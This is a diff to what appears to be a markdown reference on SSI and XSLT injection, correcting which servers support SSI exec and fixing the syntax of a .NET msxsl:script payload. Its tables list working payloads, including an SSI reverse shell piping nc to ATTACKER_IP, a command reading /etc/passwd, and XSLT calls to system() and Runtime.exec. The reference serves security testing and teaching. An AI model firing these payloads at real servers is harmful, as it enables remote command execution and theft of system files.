@@ -41,7 +41,7 @@ The `exec` directive is the most dangerous SSI primitive, providing direct OS co
 
 | Subtype | Mechanism | Example | Key Condition |
 |---------|-----------|---------|---------------|
-| **exec cmd** | Executes an arbitrary shell command via `/bin/sh` (Unix) or `cmd.exe` (Windows) | `<!--#exec cmd="id" -->` | `Options +Includes` without `IncludesNOEXEC` (Apache); SSI exec enabled (Nginx) |
+| **exec cmd** | Executes an arbitrary shell command via `/bin/sh` (Unix) or `cmd.exe` (Windows) | `<!--#exec cmd="id" -->` | `Options +Includes` without `IncludesNOEXEC` (Apache); IIS with `ssinc.dll`. Note: Nginx's native SSI module does **not** support `exec` — see server-specific notes below |
 | **exec cgi** | Executes a CGI script at the specified path, inheriting the server's execution context | `<!--#exec cgi="/cgi-bin/attack.cgi" -->` | CGI execution must be enabled; attacker needs to place or reference a script |
 | **Reverse shell via exec** | Chains shell commands to establish an outbound connection | `<!--#exec cmd="mkfifo /tmp/f;nc ATTACKER_IP PORT 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` | Network egress from server; `exec cmd` enabled |
 | **Chained command execution** | Uses shell operators (`;`, `&&`, `\|`, backticks) to chain multiple commands within a single `exec` directive | `<!--#exec cmd="cat /etc/passwd; whoami; uname -a" -->` | Same as `exec cmd` |
@@ -288,7 +288,7 @@ XSLT processors expose language-native function invocation through extension nam
 | **libxslt** | PHP / Python / C | `php:function()` calls any registered PHP function | `<xsl:value-of select="php:function('system','id')"/>` (xmlns:php="http://php.net/xsl") | `registerPHPFunctions()` called without allowlist |
 | **Xalan** | Java | Namespace URI maps directly to Java class: `http://xml.apache.org/xalan/java/{class}` | `rt:exec(rt:getRuntime(),'id')` (xmlns:rt=".../java.lang.Runtime") | Extensions enabled (default) |
 | **Saxon PE/EE** | Java / .NET | Reflexive extensions map XPath calls to Java methods | `Runtime:exec(Runtime:getRuntime(),'whoami')` (xmlns:Runtime="java:java.lang.Runtime") | Saxon-PE or Saxon-EE (not HE); `xsl:evaluate` available in XSLT 3.0 mode on all editions |
-| **MSXML / System.Xml** | .NET | `msxsl:script` embeds arbitrary C#/VB.NET/JScript code | `<msxsl:script language="C#">Process.Start("cmd","/c whoami")</msxsl:script>` | `XsltSettings.TrustedXslt` or `XsltSettings(true, true)` — default disables scripting |
+| **MSXML / System.Xml** | .NET | `msxsl:script` defines extension functions in C#/VB.NET/JScript callable from XPath | `<msxsl:script implements-prefix="user" language="C#">public string exec() { System.Diagnostics.Process.Start("cmd","/c whoami"); return ""; }</msxsl:script>` → call via `<xsl:value-of select="user:exec()"/>` | `XsltSettings.TrustedXslt` or `XsltSettings(true, true)` — default disables scripting |
 
 All processors also support `document()` for file read/SSRF (§3-2) and may allow JNDI lookups (Xalan), file write via EXSLT `exsl:document` (libxslt), or dynamic XPath evaluation via `xsl:evaluate`/`saxon:evaluate` (Saxon).
 
